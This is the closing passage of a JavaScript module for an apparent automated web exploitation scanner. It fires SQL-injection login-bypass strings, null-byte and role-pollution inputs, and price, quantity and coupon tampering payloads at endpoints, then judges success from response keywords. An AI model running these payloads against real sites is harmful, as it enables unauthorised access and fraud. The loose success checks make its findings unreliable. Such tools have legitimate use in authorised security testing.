      console.error(`       ‚úó Open redirect test error: ${error.message}`);
    }
    
    return results;
  }

  /**
   * Test Authentication Bypass
   * Professional technique: JWT manipulation, SQL injection in auth, parameter pollution
   */
  static async testAuthBypassOnly(endpoint, parameter) {
    console.log(`    üéØ Testing Authentication Bypass Only`);
    const results = [];
    
    // Skip if parameter is invalid
    if (!parameter || !parameter.name || parameter.name === 'undefined') {
      return results;
    }
    
    // Only test on login/auth related endpoints
    const authPatterns = ['login', 'auth', 'signin', 'authenticate', 'session', 'token', 'password', 'user', 'admin'];
    const isAuthEndpoint = authPatterns.some(pattern => 
      endpoint.url.toLowerCase().includes(pattern) || 
      parameter.name.toLowerCase().includes(pattern)
    );
    
    if (!isAuthEndpoint) {
      console.log(`       ‚ö† Not an auth endpoint, skipping auth bypass test`);
      return results;
    }
    
    try {
      // Professional auth bypass techniques
      const authBypassPayloads = [
        { payload: "admin' OR '1'='1", type: 'SQL Injection bypass', confidence: 95 },
        { payload: "admin' --", type: 'SQL comment bypass', confidence: 95 },
        { payload: "' OR 1=1 --", type: 'SQL OR bypass', confidence: 95 },
        { payload: "admin", type: 'Default credentials', confidence: 70 },
        { payload: '{"role":"admin"}', type: 'JSON parameter pollution', confidence: 80 },
        { payload: 'admin\x00user', type: 'Null byte injection', confidence: 85 }
      ];
      
      for (const test of authBypassPayloads) {
        const testPayload = { payload: test.payload, type: 'AuthBypass' };
        const response = await ExploitationEngine.executeTest(endpoint, parameter, testPayload);
        
        if (response.success && response.data) {
          const data = String(response.data).toLowerCase();
          
          // Indicators of successful authentication bypass
          const successIndicators = [
            'welcome', 'dashboard', 'logged in', 'success', 'token', 
            'session', 'authenticated', 'admin panel', 'profile'
          ];
          
          const hasSuccessIndicator = successIndicators.some(indicator => 
            data.includes(indicator)
          );
          
          const noErrorIndicator = !data.includes('error') && 
                                   !data.includes('invalid') && 
                                   !data.includes('incorrect') &&
                                   !data.includes('failed');
          
          if (hasSuccessIndicator && noErrorIndicator) {
            results.push({
              vulnerable: true,
              type: 'Authentication Bypass',
              subType: test.type,
              evidence: [
                `Auth bypass detected using ${test.type}`,
                `Payload: ${test.payload}`,
                `Successfully authenticated without valid credentials`,
                `Response indicates successful login`
              ],
              confidence: test.confidence,
              payloadUsed: test.payload,
              context: test.type
            });
            
            console.log(`         ‚úÖ Authentication Bypass! ${test.type}`);
            break;
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
    } catch (error) {
      console.error(`       ‚úó Auth bypass test error: ${error.message}`);
    }
    
    return results;
  }

  /**
   * Test Business Logic Vulnerabilities
   * Professional technique: Price manipulation, negative quantities, workflow bypass
   */
  static async testBusinessLogicOnly(endpoint, parameter) {
    console.log(`    üéØ Testing Business Logic Vulnerabilities Only`);
    const results = [];
    
    // Skip if parameter is invalid
    if (!parameter || !parameter.name || parameter.name === 'undefined') {
      return results;
    }
    
    // Test different business logic scenarios based on parameter type
    const priceParams = ['price', 'amount', 'cost', 'total', 'value', 'payment'];
    const quantityParams = ['quantity', 'qty', 'count', 'items', 'number'];
    const discountParams = ['discount', 'coupon', 'promo', 'voucher', 'code'];
    
    const paramLower = parameter.name.toLowerCase();
    
    try {
      // Test 1: Negative value manipulation
      if (priceParams.some(p => paramLower.includes(p)) || 
          quantityParams.some(p => paramLower.includes(p))) {
        
        const negativePayloads = ['-1', '-999', '-0.01', '0'];
        
        for (const payload of negativePayloads) {
          const testPayload = { payload: payload, type: 'BusinessLogic' };
          const response = await ExploitationEngine.executeTest(endpoint, parameter, testPayload);
          
          if (response.success && response.data) {
            const data = String(response.data).toLowerCase();
            
            // Check if negative value was accepted
            const acceptedNegative = data.includes('success') || 
                                    data.includes('confirmed') ||
                                    data.includes('total') ||
                                    !data.includes('error');
            
            if (acceptedNegative) {
              results.push({
                vulnerable: true,
                type: 'Business Logic Flaw',
                subType: 'Negative Value Manipulation',
                evidence: [
                  `Application accepts negative ${parameter.name}`,
                  `Payload: ${payload}`,
                  `Could lead to financial loss or free items`,
                  `No proper input validation on business-critical field`
                ],
                confidence: 85,
                payloadUsed: payload,
                context: 'Negative value accepted'
              });
              
              console.log(`         ‚úÖ Business Logic Flaw! Negative value accepted`);
              break;
            }
          }
          
          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }
      
      // Test 2: Excessive quantity/amount
      if (quantityParams.some(p => paramLower.includes(p))) {
        const excessivePayloads = ['999999', '2147483647', '9999999999'];
        
        for (const payload of excessivePayloads) {
          const testPayload = { payload: payload, type: 'BusinessLogic' };
          const response = await ExploitationEngine.executeTest(endpoint, parameter, testPayload);
          
          if (response.success && response.data) {
            const data = String(response.data).toLowerCase();
            
            const acceptedExcessive = (data.includes('success') || data.includes('added')) &&
                                     !data.includes('limit') &&
                                     !data.includes('maximum');
            
            if (acceptedExcessive) {
              results.push({
                vulnerable: true,
                type: 'Business Logic Flaw',
                subType: 'Excessive Quantity Manipulation',
                evidence: [
                  `Application accepts unrealistic ${parameter.name}`,
                  `Payload: ${payload}`,
                  `Could lead to inventory issues or DoS`,
                  `No business rule validation on quantity limits`
                ],
                confidence: 80,
                payloadUsed: payload,
                context: 'Excessive quantity accepted'
              });
              
              console.log(`         ‚úÖ Business Logic Flaw! Excessive quantity accepted`);
              break;
            }
          }
          
          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }
      
      // Test 3: Discount/Coupon manipulation
      if (discountParams.some(p => paramLower.includes(p))) {
        const discountPayloads = ['100%', '999', 'ADMIN', 'TEST123', '1+1'];
        
        for (const payload of discountPayloads) {
          const testPayload = { payload: payload, type: 'BusinessLogic' };
          const response = await ExploitationEngine.executeTest(endpoint, parameter, testPayload);
          
          if (response.success && response.data) {
            const data = String(response.data).toLowerCase();
            
            const discountApplied = data.includes('discount') || 
                                   data.includes('applied') ||
                                   data.includes('saved') ||
                                   data.includes('0.00') ||
                                   data.includes('free');
            
            if (discountApplied && !data.includes('invalid')) {
              results.push({
                vulnerable: true,
                type: 'Business Logic Flaw',
                subType: 'Discount/Coupon Manipulation',
                evidence: [
                  `Application accepts manipulated discount code`,
                  `Payload: ${payload}`,
                  `Could allow 100% discounts or free purchases`,
                  `Weak coupon validation logic`
                ],
                confidence: 85,
                payloadUsed: payload,
                context: 'Discount manipulation possible'
              });
              
              console.log(`         ‚úÖ Business Logic Flaw! Discount manipulation detected`);
              break;
            }
          }
          
          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }
      
    } catch (error) {
      console.error(`       ‚úó Business logic test error: ${error.message}`);
    }
    
    return results;
  }

  /**
   * Helper: Calculate text similarity (for IDOR detection)
   */
  static _calculateSimilarity(str1, str2) {
    const longer = str1.length > str2.length ? str1 : str2;
    const shorter = str1.length > str2.length ? str2 : str1;
    
    if (longer.length === 0) return 1.0;
    
    const editDistance = this._levenshteinDistance(shorter, longer);
    return (longer.length - editDistance) / longer.length;
  }

  /**
   * Helper: Levenshtein distance for similarity calculation
   */
  static _levenshteinDistance(str1, str2) {
    const matrix = [];
    
    for (let i = 0; i <= str2.length; i++) {
      matrix[i] = [i];
    }
    
    for (let j = 0; j <= str1.length; j++) {
      matrix[0][j] = j;
    }
    
    for (let i = 1; i <= str2.length; i++) {
      for (let j = 1; j <= str1.length; j++) {
        if (str2.charAt(i - 1) === str1.charAt(j - 1)) {
          matrix[i][j] = matrix[i - 1][j - 1];
        } else {
          matrix[i][j] = Math.min(
            matrix[i - 1][j - 1] + 1,
            matrix[i][j - 1] + 1,
            matrix[i - 1][j] + 1
          );
        }
      }
    }
    
    return matrix[str2.length][str1.length];
  }
}

module.exports = AdvancedExploitationService;
